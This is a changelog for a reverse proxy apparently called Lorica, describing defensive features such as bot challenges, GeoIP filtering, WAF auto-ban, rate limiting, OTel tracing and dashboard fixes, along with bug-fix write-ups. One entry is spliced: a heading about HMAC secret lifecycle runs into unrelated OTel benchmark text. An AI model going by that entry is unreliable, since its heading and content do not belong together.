- **Dashboard Bot Protection tab section** (v1.4.0 Epic 3, story 3.8). Under Routes &rarr; Protection, below the GeoIP filter: a toggle switch to enable / disable per route, a mode dropdown (Cookie / JavaScript / Captcha), cookie-TTL input (1..=604800), and mode-specific controls. JavaScript mode surfaces the PoW difficulty slider (14..=22) with live "expected median solve time" hint text that matches the scale table in the design doc - the slider value flips the hint between "~50 ms", "~800 ms (~2 s on mobile)", "~12 s (UX degraded on mobile)" so the operator sees the friction-vs-bot-cost trade without reading the spec. Captcha mode surfaces the alphabet editor with the curated default pre-filled. Bypass editor has three sub-sections: IP CIDRs (comma-separated), countries (ISO alpha-2), User-Agent regexes (newline-separated because commas legitimately appear in regex syntax); `only_country` inverse gate below. ASN and rDNS bypass deferred-to-follow-up status surfaced inline. Form state + API mapping wired in `lib/route-form.ts` + `lib/api.ts` (new `BotProtectionConfig` / `BotProtectionMode` / `BotBypassRules` types). 178 frontend tests PASS, `svelte-check` clean
- **Bot-protection verdict cache** (v1.4.0 Epic 3, story 3.6). Per-process DashMap cache of (route_id, IP prefix, cookie hash) → expires_at. `evaluate()` checks the cache BEFORE re-running HMAC-SHA256 verify; a hit short-circuits at ~50 ns vs ~1 µs for the full verify. Cached entries carry the cookie's own `expires_at` so a stale cache entry cannot extend a cookie past its TTL. FIFO-bounded at 16 384 entries matching the existing `forward_auth` cache shape. Four unit tests cover hit-skips-verify, expired-entry-is-miss, key-differs-per-scope, and FIFO eviction at capacity. Cross-worker sharing via `VerdictCacheEngine::Rpc` evaluated and deferred to a follow-up (the HMAC verify is fast enough that an RPC hop would be a net loss)
- **Bot-protection metrics + OTel span attributes** (v1.4.0 Epic 3, story 3.7). New Prometheus counter `lorica_bot_challenge_total{route_id, mode, outcome}` with outcome ∈ { shown / passed / failed / bypassed }. Fires from every terminal decision point: the evaluator (passed on valid cookie, bypassed on bypass-category or only_country-miss), `serve_challenge` (shown on the HTML / plain-text render, passed on Cookie-mode's immediate verdict issuance), `handle_solve` (passed on successful verify, failed on wrong answer / expired nonce). Routes without bot_protection never touch the counter. Three new fields on the per-request `http_request` OTel span - outcome, mode, reason - finer granularity than the Prometheus labels so Jaeger / Tempo can break down the `bypassed` bucket per reason without inflating Prometheus cardinality
- **Bot-protection HMAC secret lifecycle** (v1.4.0 Epic 3, story 3.5a). New `apply_bot_secret_from_store` hook in `lorica::reload` that runs inside every `reload_proxy_config*` entry point. First-boot path: reads the persisted hex secret from `GlobalSettings.bot_hmac_secret_hex`; generates + persists a fresh 32-byte secret via `lorica_challenge::secret::generate` if the column is empty or malformed (log at info! / warn!). Subsequent reloads read the same hex, dedup via an in-memory snapshot, and install via `secret::rotate` when it changes (enables the cert-renewal rotation path that lands in story 3.8 without any further plumbing). Hex parse + encode helpers are private to the reload module because the wire format is a library-internal contract. `lorica` now depends on `lorica-challenge` + `sha2 0.10` for the request-filter integration that lands in 3.5c
- **Bot-protection evaluator + in-process challenge stash** (v1.4.0 Epic 3, story 3.5c - foundations). New `lorica::bot` module with two concerns: (a) `BotEngine`, a `parking_lot::Mutex<HashMap>` stash for pending PoW and captcha challenges with `fresh_nonce` (16-byte hex via `OsRng`), `insert` (overwrite-on- collision - 2^-128 collision probability makes the branch unobservable in practice), `take` (atomic remove + return, so a single challenge can be verified at most once - replay defence), `captcha_image` (read-only PNG lookup that does NOT consume the entry, so a user can reload the image without losing the challenge), and `prune_expired`; (b) `evaluate`, a pure-logic decision function with signature `EvalInputs -> Decision` that walks the bypass matrix in strict order per the design doc § 6.3 - verdict cookie check (with route+IP-prefix scope validation), IP CIDR, country, User-Agent regex, then the `only_country` inverse gate. Returns `Decision::Pass { reason: PassReason }` or `Decision::Challenge`. The `PassReason` variants are wired up for the Prometheus counter that lands in story 3.7. URL-path routing helpers `is_bot_solve_path` / `parse_bot_captcha_path` recognise the two Lorica-handled bot endpoints with query-string tolerance and path-traversal rejection. 16 unit tests cover the cookie-scope guards (wrong route id, wrong IP prefix, both reject), the bypass-matrix ordering, the `only_country` gate in the three states (match, miss, country unknown), engine stash semantics (round-trip, take-consumes, prune-expired, captcha-image-never-consumes), URL-path parsing, and cookie extraction across whitespace variants. Actual wiring into `proxy_wiring::request_filter` is the next logical commit
- **v1.4.0 scope: ASN + rDNS bypass deferred** (v1.4.0 Epic 3, story 3.5b). `bot_protection.bypass.asns` and `bot_protection.bypass.rdns` both require significant infrastructure that did not land in v1.4.0 (ASN database + resolver for the former; a forward-confirmation DNS pipeline for the latter - an rDNS match without forward-confirm is a documented backdoor). The API validator now rejects non-empty lists for both categories with a clear error message pointing at the "tracked as a follow-up" status. Fields remain in `BotBypassRules` so the follow-up stories ship without a schema migration. Three out of five bypass categories are fully functional for v1.4.0: `ip_cidrs`, `countries`, `user_agents`
- **Bot-protection `request_filter` session wiring** (v1.4.0 Epic 3, story 3.5d). New `lorica::proxy_wiring::bot_handlers` submodule carries the three session-interactive handlers + form / cookie / response helpers. `request_filter` now intercepts the two Lorica-handled cross-cutting URLs early (right after the ACME challenge): `POST /lorica/bot/solve` goes to `handle_solve` (body read bounded at 2 KiB, form parse, take stashed entry, dispatch by mode, verify, mint verdict cookie bound to stashed route_id + IP prefix, 302 to the stashed return URL), and `GET /lorica/bot/captcha/{nonce}` goes to `handle_captcha_image` (PNG lookup + one-shot `Cache-Control: no-store, private` so no proxy caches the short-lived image). After the GeoIP stage, every route with `bot_protection` is evaluated via `crate::bot::evaluate`: Pass → request forwards; Challenge → `serve_challenge` renders the mode-specific page, stashes the pending entry (PoW difficulty / captcha expected text + PNG bytes), and writes the HTML (or plain-text 403 when the Accept header does not advertise `text/html`, so curl / wget see a line instead of a blob of HTML). Cookie-mode is special: no server-side stash + no solve round trip, the page IS the verdict issuance (meta-refresh bounces + Set-Cookie header). Form parsing is a 50-line local implementation of application/x-www-form-urlencoded (percent decode + `+` as space + skip-malformed) - no new dependency. `Set-Cookie` header includes `HttpOnly`, `SameSite=Lax`, `Max-Age`, `Path=/`; `Secure` is deliberately omitted for dev-HTTP deployments and can become per-route in a follow-up. 9 new unit tests cover the form parser (percent, plus-as-space, malformed, truncated escapes), Accept-HTML detection, cookie header shape, and hex ↔ 16-byte round-trips
- **Bot-protection HMAC secret lifecycle** (v1.4.0 Epic 3, story: three groups (`otel_traceparent`, `otel_active_span`, `otel_per_request`) cover the six atomic operations that every request touches (parse valid / malformed traceparent, synthesise from request_id, derive child traceparent, serialise wire format, span creation / is_recording / end / set_str / set_i64 / set_status) plus two end-to-end scenarios that aggregate the full OTel touch-points a single request incurs. Runs under both default and `--features otel` so operators can quantify the cost of compiling the feature in without installing a real provider. Reference numbers (Docker `rust:1-bookworm`, bench profile, 30-sample criterion run): `parse_valid` 77 ns / 76 ns (-0.8 % under `otel`), `parse_malformed` 31 ns / 29 ns (-5.6 %), `synthesise_from_request_id` 140 ns / 150 ns (+7.0 %), `child_from_parent` 123 ns / 132 ns (+7.8 %), `to_header_value` 99 ns / 91 ns (-9.0 %), `empty_construction` 23 ps / near-ZST. Aggregate per-request OTel touch-point budget stays under 500 ns with the feature off (W3C parse + child + serialise + ZST span ops) and under 600 ns with the feature on but no provider installed - well within the ROADMAP-stated "< 2 % proxy overhead at sampling 0.1" target. Exercised by CI as part of the standard bench harness (criterion 0.5) alongside the existing `circuit_breaker` and `canary_bucket` benches
- Test coverage expansion for v1.4.0 (no feature changes, no new runtime dependencies). 41 new tests across three layers. (1) Frontend vitest for the CountryPicker pure logic: extracted `parseCountryValue` / `serializeCountryValue` / `findIsoCodeInAncestry` / `toggleCountry` from the Svelte component into `lorica-dashboard/frontend/src/lib/country-picker.ts` so vitest can exercise them without standing up the SVG map in jsdom (20 assertions covering CSV/whitespace parsing, case normalisation, dedup, length-2 filter, DOM ancestor walk, ISO-code toggling, set-immutability). (2) Rust unit / integration layer: `test_update_route_bot_protection_disable_*` (2 cases) pinning the boolean clear semantics from `UpdateRouteRequest`; `test_rotate_bot_hmac_*` (2 cases) verifying `AppState::rotate_bot_hmac_on_cert_event` writes a different, well-formed 64-char hex secret into `global_settings` AND is non-deterministic across two back-to-back calls (CSPRNG sanity); `bot_secret_hex_tests` in `lorica::reload` (6 cases) pinning the round-trip, case-tolerance, whitespace-trim, wrong-length, and non-hex rejection branches of the `{parse,encode}_bot_secret_hex` pair; `test_otel_connection_*` (3 cases) exercising the settings endpoint with a tokio-spawned one-shot HTTP mock server for reachable, a closed-port for unreachable, and absent-endpoint for the "save a URL first" message; `resolve_and_cache_writes_negative_entry_on_resolver_failure` in `lorica::bot_rdns` proving the rDNS resolver populates the LRU with `Some(None)` when a lookup fails so the hot-path cache_check short-circuits on subsequent requests; `otel::shutdown_tests` (4 cases, feature-gated behind `otel`) covering idempotency, noop-before-init tolerance, init->shutdown round-trip, and empty-endpoint short-circuit. (3) New `lorica/tests/bot_rpc_cache_e2e_test.rs` integration test (6 cases) driving `lorica::bot::rpc_cache_check` and `lorica::bot::rpc_cache_push` over a real `RpcEndpoint` socketpair with a minimal supervisor-side cache: push -> check round-trip, empty-cache returns None, Deny verdict is surfaced as None (only Allow cached), IP-prefix partitioning (two clients with the same cookie + route but different /24 prefixes do not share a verdict), unresponsive-supervisor timeout fails open, and the Local engine branch delegates to the in-process sync cache. Exercises the `bot\0<route>\0<prefix_hex>` wire key that partitions the shared supervisor verdict cache between bot and forward_auth
- rDNS-bypass Docker E2E smoke under a new docker-compose `rdns` profile (v1.4.0 Epic 3 follow-up). Adds a `dnsmasq` sidecar (strm/dnsmasq:latest) configured via `tests-e2e-docker/fixtures/dnsmasq-rdns.conf` to serve a test zone with one forward-confirmed PTR (203.0.113.42 <-> crawler.bot-e2e.local) and one deliberately-spoofed PTR (203.0.113.77 -> spoofed.bot-e2e.local whose forward A points elsewhere). `entrypoint-rdns.sh` rewrites `/etc/resolv.conf` in the lorica container to point at the dnsmasq service IP so hickory-resolver's `from_system_conf` picks up the test zone, then boots lorica normally. `run-rdns-smoke.sh` creates a route with `bot_protection.bypass.rdns = ["bot-e2e.local"]` and drives two client IPs via `X-Forwarded-For`: the trusted IP must bypass the challenge after the async rDNS cache populate settles (up to 5 retries x 1 s), and the spoofed IP must keep seeing the challenge forever - the forward-confirmation step is the entire reason the bypass rule is safe to ship, so a passing smoke proves the design-doc § 10.3 threat model is intact. Run via `docker compose --profile rdns run --rm rdns-smoke` (not yet wired into the default `run.sh` aggregator - tracked as a follow-up once the profile has been stabilised against CI DNS flakiness)

### Fixed

- Bot-protection `/lorica/bot/solve` endpoint mis-rejected solutions with 403 when the client was reached via a trusted proxy (v1.4.0 Epic 3 follow-up surfaced by the `bot` E2E profile). The challenge-render path unwrapped X-Forwarded-For and stashed the pending entry's IP prefix under the resolved client's /24 or /64, but the cross-cutting `/lorica/bot/solve` interception read the raw TCP client address. The stashed prefix and the solve-time prefix did not match, so the "client network changed" guard fired on every legitimate solve. The interception now runs the same XFF-trust check as `request_filter` proper (direct TCP client ∈ `trusted_proxies` → honour the leftmost XFF entry).
- `lorica_geoip_block_total` Prometheus counter label `route_id` was always `_unknown` in worker mode and often `_unknown` in single-process (v1.4.0 Epic 2 follow-up surfaced by the new `geoip` E2E profile). The counter callsite in `proxy_wiring::request_filter` read `ctx.route_id` which is only populated further down the filter (after response-headers, forward-auth, etc.), so a GeoIP rejection always fired with the unset fallback. Switched to `entry.route.id` which is already bound in scope at the point the rule evaluates
- GeoIP DB sanity check was too strict for test fixtures (v1.4.0 Epic 2 follow-up). `load_from_path` rejected any `.mmdb` where `8.8.8.8` did not resolve, which blocked the MaxMind open-licensed test fixture we ship in `tests-e2e-docker/fixtures/`. The check now tries a list of probes (8.8.8.8, 1.1.1.1, and a known-hit from the MaxMind test fixture) and accepts the DB if ANY of them resolves - strict enough to reject an empty / wrong-type DB, permissive enough to accept test databases that index a partial IPv4 space
- OTLP HTTP exporter endpoint composition (v1.4.0 Epic 1 follow-up to story 1.4a). opentelemetry-otlp 0.31 does not auto-suffix the signal path onto `with_endpoint(base_url)` for HTTP transports - the POST lands on `/` and Jaeger / Tempo / the OTel collector all reply 404. `lorica::otel::init` now appends `/v1/traces` when the configured `otlp_endpoint` does not already include it, so operators can paste the base URL from their collector and still get spans through. gRPC transport is unchanged (the path is implicit in the proto definition).
- OTLP exporter panic on BatchSpanProcessor worker thread (v1.4.0 Epic 1 follow-up). The SDK spawns a dedicated OS thread (not a Tokio task) for the batch processor; the `reqwest-client` (async) feature on opentelemetry-otlp 0.31 panicked with "there is no reactor running, must be called from the context of a Tokio 1.x runtime" whenever that thread tried to flush. Switched to `reqwest-blocking-client` so the batch processor uses the synchronous reqwest API, which does not need a Tokio context.
- OTel settings hot-reload (v1.4.0 Epic 1 follow-up). A dashboard edit to `otlp_endpoint` / `otlp_protocol` / `otlp_service_name` / `otlp_sampling_ratio` previously required a process restart to take effect because `otel::init` only ran at startup from `main.rs`. New `apply_otel_settings_from_store` helper in `lorica::reload` snapshots the four fields, hashes them, and calls `otel::init` / `otel::shutdown` only when the snapshot diverges from the last applied value (so unrelated config edits do not churn the BatchSpanProcessor). Wired into every `reload_proxy_config*` entry point - live for single-process, supervisor, and worker runtimes.
- Dashboard System page reported inflated disk totals (observed 278.5 GB / 28.2 GB used on a host whose root is 93 GB / 4.7 GB used). `get_system` called `sysinfo::Disks::new_with_refreshed_list()` and summed every entry from `/proc/self/mountinfo`, counting tmpfs, devtmpfs, overlayfs, bind mounts, and snap squashfs as real storage - the doc-comment claimed "(root mount)" but the implementation had drifted. `HostMetrics` now exposes two distinct `DiskUsage` entries: `disk_root` for the `/` mount and `disk_data` for the filesystem that holds `--data-dir`. Values come from a direct `statvfs(path)` call (via `nix 0.29`, staying inside the crate-wide `#![deny(unsafe_code)]`) so "used" matches `df -h`'s "Used" column exactly instead of including the reserved-for-root pool (~5 % of total on ext4 default) that sysinfo's `available_space()` excludes. `AppState` gains a `data_dir: PathBuf` field threaded from CLI through both supervisor and single-process construction sites. Frontend renders one gauge per entry with the mount path as a subtitle under the title; a "same as root" tag fires when the two gauges share identical `(total_bytes, used_bytes)` - namespaced bind mounts under systemd's `ProtectSystem=strict` report different mount_point strings but the same underlying storage, so string comparison alone misses the match.
- Maintenance mode is now toggled from the Routes list (inline button between Edit and Delete) instead of the edit drawer. An operator taking a hot route out of service no longer has to open the drawer, scroll, tick a box, and save - one click on the wrench icon fires `PUT /api/v1/routes/{id}` with `maintenance_mode: true/false` and the list refreshes. Enabling maintenance goes through a warning-style confirmation modal ("all requests to ... will return 503, continue?") - the blast radius is every client and the wrench icon sits right next to Edit + Delete, so a mis-click must not flip a production route into 503. Disabling maintenance fires directly since it only restores service. The whole row carries a tinted background + orange left-border + `MAINT` badge when maintenance is on so the 503-serving routes are unmissable. The `maintenance_mode` field is deliberately removed from the drawer's save payload (frontend-only change, API unchanged): a stale drawer can no longer overwrite a freshly-toggled value. `error_page_html` textarea in the drawer's General tab stays visible at all times (previously hidden behind the now-gone checkbox) since it is also rendered for 502 / 504 upstream errors. `ConfirmDialog` gains a `warning` confirmStyle (amber button) alongside the existing `danger` (red) and `primary` (blue).
- Workers crash-loop after an ACME certificate renewal: every worker failed to load the proxy configuration with `invalid datetime '2026-04-17 19:13:17': premature end of input` and the supervisor respawned them forever. Root cause: `lorica-config/src/store/certs.rs::reassign_certificate` wrote `UPDATE routes SET updated_at = datetime('now')` as a raw SQL fragment during cert rotation. SQLite's `datetime('now')` returns the SQL-plain format (`2026-04-17 19:13:17`, space separator, no timezone), but `lorica-config/src/store/row_helpers.rs::parse_datetime` expected strict RFC3339 via `DateTime::parse_from_rfc3339`, so every subsequent config reload rejected the row. Double fix: (1) `reassign_certificate` now binds `Utc::now().to_rfc3339()` as a parameter, matching the pattern used by every other route writer; (2) `parse_datetime` hardened to accept both RFC3339 and SQLite SQL-plain (with or without fractional seconds) as a defensive fallback so legacy rows or any future DEFAULT-based write cannot repeat the crash. 8 new unit tests in `row_helpers::tests` cover both formats + fractional seconds + garbage/empty rejection. Reported live on 2026-04-17 21:13 CEST.
- Route `return_status` wrote an empty response body instead of rendering the error page. `proxy_wiring::request_filter` wrote `ResponseHeader::build(status, None)` + no body when a route had `return_status` set without `redirect_to`, so clients got a status code with a blank page - inconsistent with every other terminal path (403 IP / WAF / GeoIP, 429 rate limit, 502 / 504 upstream) which render Lorica's branded error page via `render_error_body()`. The operator's optional `error_page_html` template was also ignored on this path. Fixed by routing the branch through `render_error_body(status, error_page_html)` with the HTML body + `Content-Type: text/html; charset=utf-8` + explicit `Content-Length`. The path rule's `error_page_html` overrides the route-level default when set (picked up from `ctx.route_snapshot`).
- Clear-on-empty semantics audit across the Edit Route drawer. Most optional text / list / number fields already emitted `Some("")` / `Some([])` on update via the `empty()` helper in `buildAdvancedFields`, so an operator wiping the textarea genuinely cleared the stored value. The two holdouts were `basic_auth_username` and `basic_auth_password` (both used `|| undefined`, which the backend interpreted as "leave unchanged" - clearing the field from the UI had no effect). Username now clears on empty. Password is nuanced: an empty password with a non-empty username preserves the existing Argon2id hash ("Send a new value to change it." hint); an empty password with a cleared username sends `""` explicitly so the hash is dropped when the feature is disabled.
- Drawer header effective-config summary. A new row of coloured chips under the hostname preview reads out the route's armed features: TLS, Redirect, Returns 4xx, Sticky, Split %, header / path rule counts, Mirror %, WAF mode, Basic / Forward auth, mTLS required / optional, Rate /s, GeoIP deny/allow + countries, Bot mode + difficulty, Cache TTL, gzip. The chip tones match the subsection accent palette already used inside the drawer (blue / cyan / purple / red / orange / slate / teal / pink / green). Visible regardless of the active tab so an operator can tell "this route has WAF blocking, GeoIP deny FR, Bot JS(18), Mirror 10%" at a glance instead of clicking through each tab. Empty when no feature is armed.
- Unsaved-changes confirmation on drawer close switched from `window.confirm` to the themed `ConfirmDialog` component. Matches the rest of the modal surface (dark / light theme, keyboard handling, focus management) and no longer looks like a browser-native popup dropped in the middle of the UI.
- Tab-dot modified indicator is no longer colour-only. Each drawer tab button that carries non-default values now also gets an `aria-label="{tab} (modified)"`, the dot itself announces as `role="img" aria-label="has non-default values"`, and the pill gains a white outer ring + outline in the primary colour so the mark stays legible under forced-colors and WCAG contrast 1.4.1 scenarios.
- Inline warn banners on three previously-silent cross-feature mutexes. Cache tab warns when both `cache_enabled` and `response_rewrite_rules` are set (caching wins, rewrites silently skipped). Transform > Response headers warns when `Access-Control-*` is listed there AND CORS is configured below (last-write-wins ambiguity). Routing > Sticky sessions warns when sticky is on AND traffic splits have at least one row (a sticky cookie can pin a client outside the split bucket their IP was hashed into). Each banner reuses the amber warn-banner style from Protection > Auto-ban.
- Drawer footer "risky changes" banner (dry-run preview). When editing an existing route and the pending save crosses any of four risky thresholds - load_balancing algorithm change (breaks sticky affinity for returning sessions), certificate_id swap (handshake error window during rollout), waf_enabled true -> false (inspection off + auto-ban stops firing), or mtls_required false -> true on a route that carries a CA bundle (clients without client-certs become 496) - a banner lists every risky change as a bullet just above the Save button. An operator reads the blast radius before clicking Update instead of guessing what the save will do on a live route.
- Mode-dependent fields in Protection > Bot now have ghost placeholders. Previously the PoW difficulty slider appeared only after the operator flipped `bot_mode` to `javascript`, and the Captcha alphabet only after `captcha`. Scrolling Cookie mode with no hint that the other two fields existed made the feature feel truncated. An inline ghost row (italic label, muted text, `aria-hidden`) now shows "Available after selecting JavaScript mode above." in the right spot, so the operator sees the full control surface and knows which mode unlocks what.
- Uniform two-click confirm on every rule-list delete. Path Rules used to delete a row on a single click while Canary, Header Rules and Response Rewrite all used a two-click "Confirm?" pulse. Path Rules now matches: the first click flips the trash button into a red pulsing "Confirm?" label, a second click within 3 s actually deletes, and no click within the window resets the button. One path rule can now nuke 404s on a prefix only after explicit confirmation.
- Dead code cleanup. `HeadersTab.svelte`, `CorsTab.svelte`, `TimeoutsTab.svelte` (-346 lines total) deleted. They survived as stale files through the pass-3 / pass-4 tab-taxonomy refactor but were no longer imported anywhere - their content got inlined into Transform and Upstream. Removing them also removes the misleading import-comment block in `RouteDrawer.svelte`. Long inline hints across General / Routing / Protection / Security / Response rewrite shortened to a single sentence each so the in-tab voice is consistent; detail moved into the `?` help modals that already cover the same field.
- Per-blur format validation and chip-based list editors across the Edit Route drawer (resolves UXUI.md findings #7 + #8). New `lib/validators.ts` shared module surfaces six tolerant frontend validators (CIDR, regex, http(s) URL, ASN with optional `AS` prefix, DNS suffix, ISO-3166-1 alpha-2). The API-side Rust validator remains the source of truth; the frontend checks just catch obvious typos at blur time so the operator does not tab-switch away and get an auto-scroll save error. New `components/ChipListInput.svelte` reusable component turns newline- or comma-separated string fields into editable chips with per-chip validation: invalid entries render a red border + hover tooltip with the validator's error message, `bind:value` stays a plain string so the parent form state and wire payload are unchanged from the textarea version. Enter / comma / newline adds a chip, Backspace on empty draft removes the last one, multi-entry paste splits on the separator. Wired onto five textareas + inputs: `ip_allowlist` + `ip_denylist` in Security > IP access control (CIDR validator), `bot_bypass_ip_cidrs` + `bot_bypass_asns` + `bot_bypass_rdns` in Protection > Bot protection (CIDR / ASN / DNS-suffix validators respectively). Forward-auth URL in Security now validates http(s)-shape on blur with an inline red error message; the regex pattern in Transform > Path rewrite runs `new RegExp()` on blur and surfaces a compile error the moment the field loses focus.

## [1.3.0] - 2026-04-14

### Added

- Native daily rotation + 14-file retention on the structured tracing log file (`--log-file` path). Switched `tracing_appender::rolling::never()` to `RollingFileAppender::builder().rotation(DAILY).max_log_files(14)` so an unattended install can no longer fill the disk via the JSON log stream. Today's log keeps the operator-configured filename; rotated files are date-suffixed (`lorica.log.2026-04-13`). Falls back to non-rotating append (with a stderr warning) if the builder rejects the path so a misconfigured log destination never blocks startup. External logrotate is no longer required
- Default static error pages (Cloudflare-style three-tier diagnostic layout) for every status Lorica surfaces directly: 408 (slowloris), 429 (rate limit), 403 (WAF / IP ban / blocklist / allowlist / denylist / WebSocket disabled), 495/496 (mTLS), 500/502/503/504/522 (proxy + origin). Renders a header band (title + Wikipedia link + UTC timestamp), a diagnostic strip with You / Network / Host icons and a per-status badge marking the failing tier (down-arrow notch under the broken hop), a two-column "What happened? / What can I do?" explanation, and a footer with the Request ID for log correlation. Anti-fingerprint: no proxy product name, no version, no hostname leak; the Host tier label is the request's `Host` header (already known to the requester) and is HTML-escaped. Per-route `error_page_html` override (with `{{status}}` / `{{message}}` substitution) takes precedence when configured. Wired into `fail_to_proxy`, the maintenance 503, the per-route + global max-connections 503s, the token-bucket and legacy 429 rate limiters, the mTLS 495/496 gate, the slowloris 408 reject, the WAF block 403 (request and body), the WebSocket-disabled 403, the per-route IP allowlist/denylist 403s, the pre-route IP ban + IP blocklist 403s, and the forward-auth fail-closed 503. Pre-route stages (global conn limit, IP ban, IP blocklist) always render the default page since no route override is consultable at that stage. Retry-After / X-RateLimit-Reset headers are preserved on 429 responses
- `/metrics` pull-on-scrape over pipelined RPC (WPAR worker-parity audit, Phase 6 / WPAR-7): Prometheus scrapes now trigger a fresh fan-out to every worker via the pipelined RPC channel before the handler reads the aggregated state. Each worker responds with a `MetricsReport` payload carrying per-request counters (cache_hits / cache_misses / active_connections / ban_entries / EWMA scores / backend connections / per-route request counts / WAF counts); the supervisor aggregates into `AggregatedMetrics` and the scrape encodes it. Dedup via an `Instant`-based lock collapses concurrent scrapes within a 250 ms window into a single fan-out - scraping /metrics from five concurrent Prometheus servers only hits the workers once. Per-worker 500 ms timeout bounds the fan-out; non-responders fall back silently to the cached state (populated by the existing periodic-pull task), so a stuck worker cannot stall a scrape. A 1 s wall-clock watchdog wraps the refresher call in the handler as a last resort. See design § 7
- Forward-auth verdict cache over pipelined RPC (WPAR worker-parity audit, Phase 4 / WPAR-2): `VerdictCacheEngine::Rpc` routes lookup/push through the supervisor in worker mode, so an Allow verdict cached by one worker is served from every worker's hot path on subsequent requests and a session revocation invalidates the cache uniformly across the pool. Single-process mode keeps the per-process `FORWARD_AUTH_VERDICT_CACHE` static unchanged. RPC wire is extended with `ForwardAuthHeader` so cached Allow outcomes can serve the injected upstream headers (Remote-User, Remote-Groups, ...) without a second round trip to the auth backend. Transport failure degrades gracefully: a failed lookup RPC falls through to the upstream auth call (fail-open semantics match the single-process lazy-eviction path); a failed push is fire-and-forget so the downstream request still completes. Supervisor-side cache preserves the existing `FORWARD_AUTH_VERDICT_CACHE` semantics (16 384-entry FIFO, per-route partitioning via NUL-separated key, only Allow verdicts cached, Cache-Control: no-store honored). See `docs/architecture/worker-shared-state.md` § 7
- Circuit-breaker over pipelined RPC (WPAR worker-parity audit, Phase 5 / WPAR-3): `BreakerEngine::Rpc` replaces the per-worker `CircuitBreaker::is_available` / `record_failure` / `record_success` with async `admit()` / `record()` calls that delegate to a supervisor-owned state machine. The supervisor tracks `Closed` / `Open` / `HalfOpen(in-flight probe)` per `(route_id, backend)` so a HalfOpen probe slot is allocated atomically across workers (no two workers can each believe they hold the probe at the same time), and a failure on one worker trips the breaker for every worker. `BreakerDecision` is tri-state: `Allow` (Closed), `AllowProbe` (HalfOpen slot granted), `Deny` (Open). Workers remember a probe-admitted backend on the per-request `ProxyCtx.breaker_probe_backend` so the subsequent outcome report is flagged `was_probe=true`, letting the supervisor close the breaker on probe success or bounce back to Open on probe failure. Transport error fails open so a flaky supervisor channel never DoS's the data plane. Single-process mode keeps the in-process `CircuitBreaker` unchanged under `BreakerEngine::Local`. See design § 7
- Two-phase config reload over pipelined RPC (WPAR worker-parity audit, Phase 7 / WPAR-8): `ConfigReloadPrepare` + `ConfigReloadCommit` replaces the legacy one-shot `CommandType::ConfigReload` on the legacy UDS channel. The Prepare half (2 s timeout, slow path: SQLite read + `ProxyConfig::from_store` + wrr_state preservation + mTLS fingerprint drift detection) runs concurrently on every worker; the Commit half (500 ms timeout, fast path: single ArcSwap) publishes atomically on all workers at once. The divergence window across workers collapses from ~10-50 ms (synchronous reload per worker on legacy channel) to the UDS RTT (microseconds). Per-worker `GenerationGate` enforces monotonicity: a reordered stale Prepare is rejected (`observe`), a commit for a non-matching generation is rejected while the prepared slot is preserved (`observe_commit`). Supervisor coordinator fans out both phases via `coordinate_config_reload`; on Prepare failure the legacy broadcast fallback fires so a partial RPC regression never stalls a config rollout. A worker with no RPC channel yet registered (early supervisor startup) also falls through to the legacy broadcast. See design § 7
- Per-route rate limiting (WPAR worker-parity audit, Phase 3): new `rate_limit: { capacity, refill_per_sec, scope }` config field on `Route` exposes a per-route token-bucket limiter applied after ban-list / IP-blocklist / redirect checks but before mTLS / forward-auth / WAF (cheap rejection of abusive clients before expensive evaluation). `scope: per_ip` (default) creates one bucket per (route, client IP) - isolates abusive clients without penalising the rest; `scope: per_route` creates a single shared bucket for the route - caps aggregate traffic to a fragile origin. Rejected requests return `429 Too Many Requests` with a `Retry-After` header computed from the refill rate. Dashboard: three new inputs under the Protection tab (capacity, refill/s, scope dropdown). API validates `capacity` and `refill_per_sec <= 1_000_000` to prevent `u32::MAX` overflow. Schema migration V33. Built on the `lorica_limits::token_bucket` primitives (Mutex-guarded authoritative bucket with fixed-point 1e6-scale tokens, lazy time-based refill, clock-rewind-is-noop). In multi-worker mode (`--workers N >= 1`) the supervisor holds the authoritative bucket registry and workers keep CAS-based `LocalBucket` caches that sync every 100 ms over a dedicated pipelined RPC socketpair (separate from the legacy command channel). Aggregate admission is bounded at `capacity + 100 ms × N_workers × refill_per_sec` worth of tokens - the design's documented initial-tick over-admission (§ 6) - after which workers converge on the authoritative state
- WAF auto-ban counter migrated to shared memory (WPAR worker-parity audit, Phase 3): per-IP violation counting moved from the supervisor-local DashMap (fed by UDS WAF-event forwarding) to the `lorica-shmem` `waf_auto_ban` atomic hashtable. Workers increment the cross-worker counter directly on each WAF block; the supervisor reads the counter, compares against the configured threshold, and on first crossing broadcasts `BanIp` to all workers then CAS-resets the slot so the next round starts at zero. Eliminates the dashmap/shmem/UDS triple-source skew and gives identical accounting across the pool. Single-process mode keeps the existing per-process fallback path unchanged. See `docs/architecture/worker-shared-state.md` § 5-6
- `lorica-shmem` crate (WPAR worker-parity audit, Phase 2): anonymous memfd-backed shared-memory region for cross-worker atomic counters. `SharedRegion` holds two 128 Ki-slot open-addressing hashtables (`waf_flood`, `waf_auto_ban`) used by WPAR-1 for per-IP flood and auto-ban counts. Each slot is a 64-byte cache line carrying three independent `AtomicU64` fields (key, value, last_update_ns); no seqlock - readers consume `value` with a single atomic load and writers race on commutative `fetch_add`, so there are no torn reads regardless of writer concurrency. Linear probing up to `MAX_PROBE = 16` with a `SATURATED = u64::MAX` sentinel for chain exhaustion (fail-safe: WAF treats saturation as "limit reached"). SipHash-1-3 with a 128-bit supervisor-randomized key (via `getrandom`) prevents an attacker from crafting IPs that collide into the same probe chain. `memfd_create(MFD_CLOEXEC)` + `mmap(MAP_SHARED)`; the supervisor passes the fd to each worker at fork via the existing SCM_RIGHTS machinery. Magic number (ASCII "LORICASHM") and `layout_version` verified on worker open. Synchronous `evict_once(region, now_ns, stale_after)` primitive called by the supervisor's eviction loop; CAS-based slot release leaves `value` / `last_update_ns` for the next claim to reset. 24 unit tests plus 5 fork-based multi-process integration tests (disjoint-key no-crosstalk, same-key commutative-sum, siphash-key shared across children, SIGKILL survivor sanity, probe-chain saturation). See `docs/architecture/worker-shared-state.md` § 5
